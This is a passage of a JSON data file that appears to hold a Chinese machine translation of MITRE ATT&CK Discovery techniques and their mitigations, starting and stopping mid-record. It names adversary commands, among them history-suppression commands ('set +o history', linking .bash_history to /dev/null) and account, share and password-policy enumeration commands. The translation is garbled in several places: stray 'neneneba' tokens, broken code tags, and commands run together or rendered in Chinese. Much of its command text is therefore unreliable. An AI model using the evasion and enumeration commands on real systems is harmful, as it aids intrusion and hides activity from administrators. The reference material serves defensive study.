                            "content": "有多种方法可以防止用户的命令历史记录刷新到其.bash_history文件中，包括使用以下命令：＜code＞set+o history</code＞和＜code＞set-o history</code＞重新开始日志记录"
                        },
                        {
                            "type": "code",
                            "content": "取消设置添加到用户的.bash_rc文件中的HISTFILE"
                        },
                        {
                            "type": "text",
                            "content": "；和"
                        },
                        {
                            "type": "code",
                            "content": "ln-s/dev/null~/.bash_history"
                        },
                        {
                            "type": "text",
                            "content": "将命令写入"
                        },
                        {
                            "type": "code",
                            "content": "/dev/null"
                        },
                        {
                            "type": "text",
                            "content": "。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对私钥使用强密码短语会使破解变得困难。不要在注册表中存储凭据。建立禁止在文件中存储密码的组织策略。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果软件必须在注册表中存储凭据，则确保相关帐户具有有限的权限，以便在被对手获取时不会被滥用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将文件共享限制在特定目录中，并且仅允许必要的用户访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用防止凭据存储在GPP中的修补程序KB2962486。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保开发人员和系统管理员意识到在可能留在端点系统或服务器上的软件配置文件中使用明文密码的风险。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1087",
        "name": "Account Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [
            {
                "id": "T1087.001",
                "name": "Local Account"
            },
            {
                "id": "T1087.002",
                "name": "Domain Account"
            },
            {
                "id": "T1087.003",
                "name": "Email Account"
            },
            {
                "id": "T1087.004",
                "name": "Cloud Account"
            }
        ],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图在系统上或在受损环境中获取有效帐户、用户名或电子邮件地址的列表。这些信息可以帮助对手确定存在哪些帐户，从而有助于后续行为，如暴力攻击、鱼叉式网络钓鱼攻击或帐户接管（例如，有效帐户）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会使用多种方法来枚举帐户，包括滥用现有工具、内置命令以及潜在的错误配置，从而泄露目标环境中的帐户名称、角色或权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，云环境通常提供易于访问的接口来获取用户列表。在主机上，对手可以使用默认的PowerShell和其他命令行功能来识别帐户。有关电子邮件地址和帐户的信息也可以通过搜索受感染系统的文件来提取。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "当应用程序通过UAC提升时，防止枚举管理员帐户，因为这可能会导致帐户名的泄露。注册表项位于"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators"
                        },
                        {
                            "type": "text",
                            "content": "。可以通过GPO:计算机配置>[策略]>管理模板>Windows组件>凭据用户界面：提升时计算管理员帐户来禁用它。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1010",
        "name": "Application Window Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会试图获取打开的应用程序窗口的列表。窗口列表可以传达有关系统如何使用的信息。例如，关于应用程序窗口的信息可以用于识别要收集的潜在数据，以及识别要规避的安全工具（安全软件发现）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人通常会滥用这种枚举类型的系统功能。例如，他们可以通过本机系统功能收集信息，如命令和脚本解释器命令以及本机API函数。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1217",
        "name": "Browser Information Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "2.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会列举有关浏览器的信息，以了解有关受损环境的更多信息。浏览器保存的数据（如书签、帐户和浏览历史）可以揭示有关用户的各种个人信息（如银行网站、关系/兴趣、社交媒体等），以及有关内部网络资源（如服务器、工具/仪表板或其他相关基础设施）的详细信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在对手能够访问有效凭证，特别是与浏览器缓存的登录相关联的文件中的凭证之后，浏览器信息还可以突出显示其他目标。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "具体的存储位置因平台和/或应用程序而异，但浏览器信息通常存储在本地文件和数据库中（例如"
                },
                {
                    "type": "code",
                    "content": "%APPDATA%/Google/Chrome"
                },
                {
                    "type": "text",
                    "content": "）。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1580",
        "name": "Cloud Infrastructure Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图发现基础设施即服务（IaaS）环境中可用的基础设施和资源。这包括计算服务资源，如实例、虚拟机和快照，以及其他服务的资源，包括存储和数据库服务。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "云提供商提供通过CLI发布的API和命令等方法，以提供有关基础设施的信息。例如，AWS在Amazon EC2 API中提供了一个＜code＞DescribeInstances＜/code＞API，该API可以返回关于帐户中的一个或多个实例的信息，该＜code＞ListBuckets＜/code>API返回请求的认证发送者所拥有的所有桶的列表，"
                },
                {
                    "type": "code",
                    "content": "HeadBucket"
                },
                {
                    "type": "text",
                    "content": "neneneba API，用于确定存储桶的存在以及请求发送方的访问权限，或者"
                },
                {
                    "type": "code",
                    "content": "GetPublicAccessBlock"
                },
                {
                    "type": "text",
                    "content": "API，用于检索存储桶的访问块配置。类似地，GCP的Cloud SDK CLI提供"
                },
                {
                    "type": "code",
                    "content": "gcloud计算实例列表"
                },
                {
                    "type": "text",
                    "content": "命令以列出项目中的所有Google计算引擎实例，Azure的CLI命令"
                },
                {
                    "type": "code",
                    "content": "az vm列表"
                },
                {
                    "type": "text",
                    "content": "列出虚拟机的详细信息。除了API命令外，对手还可以利用开源工具通过Wordlist扫描发现云存储基础设施。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用受损用户的访问密钥来枚举资源，以确定哪些资源对该用户可用。这些可用资源的发现可能有助于对手确定他们在云环境中的下一步行动，例如建立持久性。对手也可以使用这些信息来更改配置，以使存储桶可以公开访问，从而允许在没有身份验证的情况下访问数据。对手还可以使用基础设施发现API，如"
                },
                {
                    "type": "code",
                    "content": "DescribeDBInstances"
                },
                {
                    "type": "text",
                    "content": "来确定数据库资源的大小、所有者、权限和网络ACL。敌人可以使用这些信息来确定数据库的潜在价值，并发现访问数据库的需求。与云服务发现不同，此技术侧重于发现所提供服务的组件，而不是服务本身。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据最低权限限制发现云基础设施的权限。组织应限制组织内具有管理权限的IAM角色的用户数量，努力减少所有永久特权角色分配，并定期对IAM用户、角色和策略进行权限审查。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1538",
        "name": "Cloud Service Dashboard",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能使用具有被盗凭证的云服务仪表板GUI从操作云环境中获取有用信息，例如特定服务、资源和功能。例如，GCP指挥中心可用于查看所有资产、潜在安全风险的发现，并运行其他查询，如查找公共IP地址和开放端口。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "根据环境的配置，对手可能能够通过图形仪表板列举比API更多的信息。这允许对手在不发出任何API请求的情况下获取信息。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过仅将仪表板可见性限制为所需资源，强制执行最低权限原则。在帐户受损的情况下，这可能会限制仪表板的发现值。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1526",
        "name": "Cloud Service Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会在获得访问权限后尝试枚举系统上运行的云服务。这些方法可以不同于平台即服务（PaaS）、基础设施即服务（IaaS）或软件即服务（SaaS）。许多服务存在于各种云提供商中，包括持续集成和持续交付（CI/CD）、Lambda Functions、Azure AD等。它们还可能包括安全服务，如AWS GuardDuty和Microsoft Defender for cloud，以及日志记录服务，如AWSCloudTrail和Google cloud Audit Logs。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能试图发现有关在整个环境中启用的服务的信息。Azure工具和API，如Azure AD Graph API和Azure Resource Manager API，可以枚举资源和服务，包括应用程序、管理组、资源和策略定义，以及标识可访问的它们的关系。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，Stormspotter是一个用于枚举和构建Azure资源和服务图的开源工具，Pacu是一个开源AWS利用框架，支持多种发现云服务的方法。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会使用获得的信息来塑造后续行为，例如瞄准枚举服务的数据或凭据，或通过禁用或修改工具或禁用或修改云日志来规避已识别的防御。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1619",
        "name": "Cloud Storage Object Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会列举云存储基础设施中的对象。敌人可能会在自动发现过程中使用这些信息来塑造后续行为，包括从云存储中请求所有或特定对象。与本地主机上的文件和目录发现类似，在识别出可用的存储服务（即云基础设施发现）后，对手可以访问存储在云基础设施中的内容/对象。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "云服务提供商提供API，允许用户枚举存储在云存储中的对象。示例包括AWS中的ListObjectsV2和Azure中的List Blob。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制将与在云存储中列出对象相关的权限授予必要的帐户。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1613",
        "name": "Container and Resource Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图发现容器环境中可用的容器和其他资源。其他资源可以包括映像、部署、pod、节点和其他信息，例如集群的状态。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "这些资源可以在web应用程序（如Kubernetes仪表板）中查看，也可以通过Docker和KubernetesAPI进行查询。在Docker中，日志可能会泄露有关环境的信息，例如环境的配置、可用的服务以及受害者可能使用的云提供商。这些资源的发现可以告知对手在环境中的下一步行动，例如如何执行横向移动以及使用哪些方法执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将与容器服务的通信限制在受管理和安全的通道上，例如本地Unix套接字或通过SSH进行远程访问。通过禁用对Docker API和Kubernetes API服务器的未经身份验证的访问，要求安全端口访问以通过TLS与API通信。在部署在云环境中的Kubernetes集群中，使用本地云平台功能来限制允许访问API服务器的IP范围。在可能的情况下，考虑启用对Kubernetes API的实时（JIT）访问，以对访问施加额外的限制。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝通过使用网络代理、网关和防火墙直接远程访问内部系统。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过将仪表板可见性仅限于所需的用户，强制执行最低权限原则。使用Kubernetes时，请避免向用户授予通配符权限或将用户添加到"
                        },
                        {
                            "type": "code",
                            "content": "system:masters"
                        },
                        {
                            "type": "text",
                            "content": "组，并使用"
                        },
                        {
                            "type": "code",
                            "content": "RoleBindings"
                        },
                        {
                            "type": "text",
                            "content": "而不是<code>ClusterRoleBindings[/code>将用户权限限制在特定名称空间。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1622",
        "name": "Debugger Evasion",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用各种手段来检测和避开调试器。调试器通常被防御者用来跟踪和/或分析潜在恶意软件有效负载的执行情况。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "调试器规避可以包括基于对指示调试环境的工件的存在的检查结果来改变行为。与虚拟化/沙盒规避类似，如果对手检测到调试器，他们可能会更改其恶意软件以脱离受害者或隐藏植入的核心功能。他们还可以在丢弃辅助或附加有效载荷之前搜索调试器工件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "具体检查会因目标和/或对手而异，但可能涉及本机API函数调用，如"
                },
                {
                    "type": "code",
                    "content": "IsDebuggerPresent（）"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "NtQueryInformationProcess（）"
                },
                {
                    "type": "text",
                    "content": "，或手动检查流程环境块（PEB）的"
                },
                {
                    "type": "code",
                    "content": "BeingDebugge"
                },
                {
                    "type": "text",
                    "content": "标志。如果在当前进程中出现异常（假设当前调试器将“吞噬”或处理潜在错误），则对调试工件的其他检查也可能试图枚举硬件断点、中断程序集操作码、时间检查或测量。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在自动发现过程中，对手可能会使用从这些调试器检查中学到的信息来塑造后续行为。还可以通过循环本机API函数调用（如"
                },
                {
                    "type": "code",
                    "content": "OutputDebugStringW（）"
                },
                {
                    "type": "text",
                    "content": "）生成的消息，分离进程或用无意义的数据淹没调试日志，从而避开调试器。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1652",
        "name": "Device Driver Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会试图枚举受害者主机上的本地设备驱动程序。关于设备驱动程序的信息可能会突出显示影响后续行为的各种见解，例如主机的功能/目的、当前安全工具（即安全软件发现）或其他防御（例如虚拟化/沙盒规避），以及潜在的可利用漏洞（例如特权升级利用）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "许多操作系统实用程序可能提供有关本地设备驱动程序的信息，例如Windows上的"
                },
                {
                    "type": "code",
                    "content": "driverquery.exe"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "EnumDeviceDrivers（）"
                },
                {
                    "type": "text",
                    "content": "neneneba API函数。关于设备驱动程序（以及相关服务，即系统服务发现）的信息也可以在注册表中获得。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Linux/macOS上，设备驱动程序（以内核模块的形式）可能在"
                },
                {
                    "type": "code",
                    "content": "/dev/code>中可见，或使用lsmod"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "modinfo"
                },
                {
                    "type": "text",
                    "content": "等实用程序可见。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1482",
        "name": "Domain Trust Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图收集有关域信任关系的信息，这些信息可用于识别Windows多域/林环境中的横向移动机会。域信任为域提供了一种机制，允许基于另一个域的身份验证过程访问资源。域信任允许受信任域的用户访问信任域中的资源。发现的信息可能有助于对手进行SID历史注入、通过票证和Kerberoasting。域信任可以使用"
                },
                {
                    "type": "code",
                    "content": "DSEnumerateDomainTrust（）"
                },
                {
                    "type": "text",
                    "content": "Win32 API调用枚举。NET方法和LDAP。众所周知，Windows实用程序Nltest被对手用来枚举域信任。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "映射现有域/林中的信任，并将信任关系保持在最低限度。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对敏感域采用网络分割。。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1083",
        "name": "File and Directory Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以列举文件和目录，或者可以在主机或网络共享的特定位置搜索文件系统内的某些信息。对手可以在自动发现过程中使用文件和目录发现中的信息来形成后续行为，包括对手是否完全感染目标和/或尝试特定行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以使用许多命令行shell实用程序来获取这些信息。示例包括"
                },
                {
                    "type": "code",
                    "content": "dir"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "tree"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "ls"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "find"
                },
                {
                    "type": "text",
                    "content": "以及"
                },
                {
                    "type": "code",
                    "content": "locate"
                },
                {
                    "type": "text",
                    "content": "。自定义工具也可用于收集文件和目录信息，并与本机API交互。对手还可以利用网络设备上的网络设备CLI来收集文件和目录信息（例如"
                },
                {
                    "type": "code",
                    "content": "dir"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "show flash"
                },
                {
                    "type": "text",
                    "content": "和/或"
                },
                {
                    "type": "code",
                    "content": "nvram"
                },
                {
                    "type": "text",
                    "content": "）。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1615",
        "name": "Group Policy Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以收集有关组策略设置的信息，以确定权限提升的路径、域内应用的安全措施，并发现可以在环境中操作或使用的域对象中的模式。组策略允许集中管理Active Directory（AD）中的用户和计算机设置。组策略对象（GPO）是组策略设置的容器，组策略设置由存储在可预测网络路径"
                },
                {
                    "type": "code",
                    "content": "\\<DOMAIN>\\SSYSVOL \\<DOMAIN>\\Policies\\"
                },
                {
                    "type": "text",
                    "content": "中的文件组成。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用"
                },
                {
                    "type": "code",
                    "content": "gpresult"
                },
                {
                    "type": "text",
                    "content": "等命令或各种公开可用的PowerShell函数，如"
                },
                {
                    "type": "code",
                    "content": "Get-DomainGPO"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "Get-DomainGPOLocalGroup"
                },
                {
                    "type": "text",
                    "content": "，来收集有关组策略设置的信息。敌人可以利用这些信息来形成后续行为，包括确定目标网络内的潜在攻击路径，以及为其利益操纵组策略设置（即域策略修改）的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1654",
        "name": "Log Enumeration",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会列举系统和服务日志来查找有用的数据。这些日志可以突出显示对手的各种类型的有价值的见解，例如用户身份验证记录（帐户发现）、安全或易受攻击的软件（软件发现）或受损网络中的主机（远程系统发现）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "主机二进制文件可以用来收集系统日志。示例包括在Windows上使用"
                },
                {
                    "type": "code",
                    "content": "wevtutil.exe"
                },
                {
                    "type": "text",
                    "content": "或PowerShell访问和/或导出安全事件信息。在云环境中，对手可能会利用Azure VM Agent的＜code＞CollectGuestLogs.exe＜/code＞等实用程序从云托管基础设施收集安全日志。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能以SIEM等集中式日志记录基础设施为目标。日志也可以批量导出并发送到对手控制的基础设施进行离线分析。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能限制访问敏感日志并将其导出到特权帐户的能力。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1046",
        "name": "Network Service Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "3.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会试图获得在远程主机和本地网络基础设施设备上运行的服务列表，包括那些可能容易受到远程软件攻击的服务。获取这些信息的常见方法包括使用系统上的工具进行端口和/或漏洞扫描。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在云环境中，对手可能会试图发现在其他云主机上运行的服务。此外，如果云环境连接到本地环境，对手也可以识别在非云系统上运行的服务。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在macOS环境中，对手可能会使用本机Bonjour应用程序来发现网络中其他macOS主机上运行的服务。Bonjour mDNSResponder守护进程自动在网络上注册和通告主机的注册服务。例如，对手可以使用mDNS查询（例如"
                },
                {
                    "type": "code",
                    "content": "dns sd-B _ssh._tcp."
                },
                {
                    "type": "text",
                    "content": "）来查找广播ssh服务的其他系统。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保关闭不必要的端口和服务，以防止发现和潜在的利用风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络入侵检测/预防系统来检测和预防远程服务扫描。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保遵循适当的网络分段，以保护关键服务器和设备。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1135",
        "name": "Network Share Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "3.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会寻找远程系统上共享的文件夹和驱动器，作为识别信息来源的一种手段，以收集信息作为收集的前兆，并识别横向移动感兴趣的潜在系统。网络通常包含共享的网络驱动器和文件夹，使用户可以通过网络访问各种系统上的文件目录。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过SMB协议在Windows网络上进行文件共享。Net可用于使用"
                },
                {
                    "type": "code",
                    "content": "Net view\\\\remotesystem"
                },
                {
                    "type": "text",
                    "content": "命令查询远程系统中可用的共享驱动器。它还可以用于使用"
                },
                {
                    "type": "code",
                    "content": "net share"
                },
                {
                    "type": "text",
                    "content": "查询本地系统上的共享驱动器。对于macOS，＜code＞sharing-l＜/code＞命令列出了用于smb服务的所有共享点。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "启用Windows组策略“不允许SAM帐户和共享的匿名枚举”安全设置以限制可以枚举网络共享的用户。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1040",
        "name": "Network Sniffing",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            },
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以嗅探网络流量以捕获关于环境的信息，包括通过网络传递的认证材料。网络嗅探是指使用系统上的网络接口来监视或捕获通过有线或无线连接发送的信息。对手可能会将网络接口置于混杂模式，以被动访问网络传输中的数据，或使用跨端口捕获大量数据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通过这种技术捕获的数据可能包括用户凭据，尤其是通过不安全的未加密协议发送的凭据。名称服务解析中毒技术，如LLMNR/NBT-NS中毒和SMB中继，也可用于通过将流量重定向到对手来捕获网站、代理和内部系统的凭据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "网络嗅探还可以揭示配置细节，如运行服务、版本号和其他网络特征（如IP地址、主机名、VLAN ID），这些特征是后续横向移动和/或防御规避活动所必需的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在基于云的环境中，对手可能仍然能够使用流量镜像服务从虚拟机中嗅探网络流量。例如，AWS流量镜像、GCP数据包镜像和Azure vTap允许用户定义从中收集流量的指定实例和将收集的流量发送到的指定目标。通常，由于在负载均衡器级别使用TLS终止来减少加密和解密流量的压力，因此这些流量中的大部分将是明文的。然后，对手可以使用诸如将数据传输到云帐户之类的过滤技术来访问被嗅探的流量。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，对手可能会使用网络设备CLI命令执行网络捕获，如"
                },
                {
                    "type": "code",
                    "content": "监视器捕获"
                },
                {
                    "type": "text",
                    "content": "。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有有线和/或无线通信都经过适当加密。使用Kerberos等身份验证协议的最佳实践，并确保可能包含凭据的web流量受到SSL/TLS的保护。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能使用多因素身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝直接访问广播和多播嗅探，并防止LLMNR/NBT-NS中毒和SMB中继等攻击"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在云环境中，除非明确要求，否则请确保未授予用户创建或修改流量镜像的权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1201",
        "name": "Password Policy Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图访问有关在企业网络或云环境中使用的密码策略的详细信息。密码策略是一种强制执行复杂密码的方法，这些密码很难通过Brute Force猜测或破解。这些信息可能有助于对手创建一个常见密码列表，并根据策略发起字典和/或暴力攻击（例如，如果最小密码长度应为8，则不尝试密码，如“pass123”；如果锁定设置为6，则每个帐户不检查3-4个以上的密码，以不锁定帐户）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "密码策略可以在Windows、Linux和macOS系统上通过各种命令行shell实用程序设置和发现，如"
                },
                {
                    "type": "code",
                    "content": "net accounts（/domain）"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "Get-ADDefaultDomainPasswordPolicy"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "chage-l"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "cat/etc/pam.d/common Password"
                },
                {
                    "type": "text",
                    "content": "以及"
                },
                {
                    "type": "code",
                    "content": "pwpolicy getaccountpolicy"
                },
                {
                    "type": "text",
                    "content": "。对手还可以利用网络设备上的网络设备CLI来发现密码策略信息（例如，"
                },
                {
                    "type": "code",
                    "content": "显示aaa"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "show aaa common criteria policy-all"
                },
                {
                    "type": "text",
                    "content": "）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "密码策略可以在云环境中使用可用的API（如AWS中的"
                },
                {
                    "type": "code",
                    "content": "GetAccountPasswordPolicy"
                },
                {
                    "type": "text",
                    "content": "）来发现。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保只注册了有效的密码筛选器。筛选器DLL必须存在于域控制器和/或本地计算机的Windows安装目录（默认情况下为"
                        },
                        {
                            "type": "code",
